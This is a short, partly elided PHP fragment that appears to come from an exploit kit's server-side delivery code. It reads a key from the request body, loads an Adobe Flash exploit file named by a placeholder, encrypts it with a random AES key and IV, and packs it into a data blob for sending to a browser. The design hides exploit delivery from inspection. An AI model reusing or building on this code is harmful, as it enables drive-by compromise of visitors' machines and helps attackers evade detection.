...
$exponent = '010001';
$modulus = file_get_contents("php://input");

// Put the Adobe Flash exploit in the same directory and change <AdobeFlashExploitNameHere> according to its name
$flash_exploit = "<AdobeFlashExploitNameHere>";

// Read file content of Adobe Flash exploit
if (file_exists($flash_exploit)) {
    $exploit_data = file_get_contents($flash_exploit);
}

// Encrypt the Adobe Flash exploit with a random 128-bit AES key
$aes = new Crypt_AES();
...
$aes->setIV($iv);
$encrypted_flash_exploit = $aes->encrypt($exploit_data);
...
$data_blob .= $iv;
$data_blob .= $encrypted_flash_exploit;
